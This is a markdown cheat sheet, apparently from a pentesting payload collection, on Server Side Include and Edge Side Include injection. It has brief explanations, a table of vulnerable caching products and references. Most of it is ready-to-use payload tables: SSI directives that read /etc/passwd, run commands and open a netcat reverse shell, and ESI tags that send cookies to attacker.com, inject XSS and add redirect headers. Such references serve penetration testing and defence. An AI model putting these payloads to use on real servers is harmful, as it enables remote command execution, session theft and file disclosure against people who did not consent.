# Server Side Include Injection

> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.


## Summary

* [Methodology](#methodology)
* [Edge Side Inclusion](#edge-side-inclusion)
* [References](#references)


## Methodology

SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.

SSI format: `<!--#directive param="value" -->`

| Description             | Payload                                  |
| ----------------------- | ---------------------------------------- |
| Print the date          | `<!--#echo var="DATE_LOCAL" -->`         |
| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`      |
| Print all the variables | `<!--#printenv -->`                      |
| Setting variables       | `<!--#set var="name" value="Rich" -->`   |
| Include a file          | `<!--#include file="/etc/passwd" -->`    |
| Include a file          | `<!--#include virtual="/index.html" -->` |
| Execute commands        | `<!--#exec cmd="ls" -->`                 |
| Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |


## Edge Side Inclusion

HTTP surrogates cannot differentiate between genuine ESI tags from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.

Some surrogates will require ESI handling to be signaled in the Surrogate-Control HTTP header.

```ps1
Surrogate-Control: content="ESI/1.0"
```

| Description             | Payload                                  |
| ----------------------- | ---------------------------------------- |
| Blind detection         | `<esi:include src=http://attacker.com>`  |
| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
| Include a file          | `<esi:include src="supersecret.txt">` |
| Display debug info      | `<esi:debug/>` |
| Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
| Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |


| Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
| -------- | -------- | ---- | ------- | ------------------------- | -------------- |
| Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
| Varnish Cache	| Yes | No   | No      | Yes                       | Yes            |
| Fastly   | Yes      | No   | No      | No                        | Yes            |
| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No              | No             |
| NodeJS' esi | Yes	  | Yes  | Yes     | No                        | No             |
| NodeJS' nodesi | Yes | No  | No      | No                        | Optional       |


## References

* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://www.youtube.com/watch?v=VUZGZnpSg8I)
* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)